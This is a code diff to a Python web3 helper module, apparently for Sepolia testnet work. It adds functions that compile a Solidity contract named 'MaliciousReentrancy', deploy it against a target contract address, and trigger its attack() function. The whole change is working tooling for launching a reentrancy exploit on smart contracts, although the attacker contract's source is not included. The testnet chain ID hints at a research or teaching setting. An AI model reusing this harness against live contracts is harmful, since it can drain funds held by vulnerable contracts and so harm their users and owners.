@@ -1,6 +1,8 @@
 from web3 import Web3
 import json
 import os
+import solcx
+from solcx import compile_standard
 
 # Load the contract ABI from a file
 def load_abi(abi_path):
@@ -205,3 +207,103 @@ def retry_transaction(w3, private_key, contract_address, abi, function_name, *ar
             print(f"Attempt {attempt + 1} failed: {str(e)}")
             continue
     raise RuntimeError("All retry attempts failed")
+
+def deploy_malicious_contract(w3: Web3, private_key: str, bytecode: str, abi: list, target_contract_address: str):
+    try:
+        account = w3.eth.account.from_key(private_key)
+        contract = w3.eth.contract(abi=abi, bytecode=bytecode)
+
+        # Pass the target address to the constructor
+        tx = contract.constructor(target_contract_address).build_transaction({
+            'chainId': 11155111,  # Sepolia chain ID
+            'from': account.address,
+            'nonce': w3.eth.get_transaction_count(account.address),
+            'gas': 2000000,
+            'gasPrice': w3.eth.gas_price
+        })
+
+        signed_tx = w3.eth.account.sign_transaction(tx, private_key)
+        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
+        tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
+
+        return tx_receipt.contractAddress
+    except Exception as e:
+        print(f"Error deploying malicious contract: {e}")
+        return None
+
+    
+def compile_solidity_contract(source_code: str):
+    """
+    Compiles a Solidity contract and returns its bytecode and ABI.
+    
+    Parameters:
+        source_code (str): Solidity source code of the contract.
+
+    Returns:
+        dict: A dictionary containing the compiled bytecode and ABI.
+    """
+    try:
+        # Set the Solidity version to be used (you can adjust the version accordingly)
+        solcx.install_solc("0.8.0")
+        solcx.set_solc_version("0.8.0")
+
+        compiled_sol = compile_standard({
+            "language": "Solidity",
+            "sources": {
+                "Contract.sol": {
+                    "content": source_code
+                }
+            },
+            "settings": {
+                "outputSelection": {
+                    "*": {
+                        "*": ["abi", "evm.bytecode"]
+                    }
+                }
+            }
+        })
+        
+        bytecode = compiled_sol['contracts']['Contract.sol']['MaliciousReentrancy']['evm']['bytecode']['object']
+        abi = compiled_sol['contracts']['Contract.sol']['MaliciousReentrancy']['abi']
+        return {
+            "bytecode": bytecode,
+            "abi": abi
+        }
+    except Exception as e:
+        print(f"Error during compilation: {e}")
+        return None 
+
+def trigger_reentrancy_attack(w3: Web3, private_key: str, contract_abi: list, contract_address: str):
+    """
+    Triggers a reentrancy attack on the target contract by calling the malicious contract.
+
+    Parameters:
+        w3 (Web3): Web3 instance connected to the blockchain.
+        private_key (str): Private key of the account calling the attack.
+        contract_abi (list): ABI of the deployed malicious contract.
+        contract_address (str): Address of the malicious contract.
+
+    Returns:
+        str: Transaction hash of the attack transaction.
+    """
+    try:
+        account = w3.eth.account.from_key(private_key)
+        contract = w3.eth.contract(address=Web3.to_checksum_address(contract_address), abi=contract_abi)
+
+        # Call the attack function from the malicious contract
+        tx = contract.functions.attack().build_transaction({
+            'chainId': 11155111,  # Sepolia chain ID
+            'from': account.address,
+            'nonce': w3.eth.get_transaction_count(account.address),
+            'gas': 2000000,
+            'gasPrice': w3.eth.gas_price
+        })
+
+        # Sign and send the transaction
+        signed_tx = w3.eth.account.sign_transaction(tx, private_key)
+        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
+
+        return tx_hash.hex()
+    except Exception as e:
+        print(f"Error in triggering reentrancy attack: {e}")
+        return None
